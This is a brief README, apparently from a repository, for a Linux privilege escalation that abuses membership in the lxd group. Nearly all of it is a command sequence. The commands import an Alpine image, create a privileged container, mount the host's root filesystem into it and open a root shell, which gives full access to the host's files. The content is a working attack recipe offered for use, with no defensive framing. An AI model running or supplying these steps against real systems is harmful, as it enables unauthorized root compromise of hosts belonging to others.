# Privesc_alpine
This alpine for linux privesc. I works when the user is part of lxd group.

```
unzip alpine.zip
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```
